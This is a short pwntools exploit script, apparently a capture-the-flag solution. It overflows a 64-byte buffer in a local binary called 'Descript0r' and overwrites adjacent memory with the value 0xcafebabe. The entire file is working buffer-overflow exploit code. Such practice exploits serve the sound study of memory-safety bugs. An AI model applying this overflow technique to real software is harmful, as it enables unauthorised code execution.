#!/usr/bin/env python3

from pwn import *

offset = 64
p = process('./Descript0r')

print(p.recv())
p.sendline(b'A'*64 + p64(0xcafebabe))
print(p.recvall())
p.close()